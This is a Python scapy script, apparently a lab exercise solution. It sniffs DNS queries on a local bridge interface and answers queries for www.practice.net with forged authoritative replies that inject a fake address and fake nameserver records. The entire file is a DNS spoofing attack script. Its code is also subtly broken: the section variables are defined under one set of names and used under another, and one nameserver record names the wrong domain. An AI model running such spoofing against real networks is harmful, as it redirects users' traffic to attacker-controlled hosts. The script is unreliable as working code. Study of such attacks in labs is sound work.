#!/usr/bin/env python3
from scapy.all import *

def spoof_dns(pkt):
  if (DNS in pkt and 'www.practice.net' in pkt[DNS].qd.qname.decode('utf-8')):

    # Swaping source IP address and destination IP address
    IP_packet = IP(dst=pkt[IP].src, src=pkt[IP].dst)

    # Swaping source port number and destination port number
    UDP_packet = UDP(dport=pkt[UDP].sport, sport=53)

    # Answer Section
    Ans_sec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                 ttl=259200, rdata='10.0.2.5')

    # Authority Section
    NS_sec1 = DNSRR(rrname='practice.net', type='NS',
                   ttl=259200, rdata='ns1.practice.net')
    NS_sec2 = DNSRR(rrname='example.net', type='NS',
                   ttl=259200, rdata='ns2.practice.net')

    # Additional Section
    Add_sec1 = DNSRR(rrname='ns1.practice.net', type='A',
                    ttl=259200, rdata='1.2.3.4')
    Add_sec2 = DNSRR(rrname='ns2.practice.net', type='A',
                    ttl=259200, rdata='5.6.7.8')

    # Constructing DNS packet
    DNS_packet = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  
                 qdcount=1, ancount=1, nscount=2, arcount=2,
                 an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2)

    # Constructing entire IP packet and sending it out
    spoof_packet = IP_packet/UDP_packet/DNS_packet
    send(spoof_packet)

# Sniff UDP query packets and invoke spoof_dns().
f = 'udp and dst port 53'
pkt = sniff(iface='br-2f902169a472', filter=f, prn=spoof_dns)      
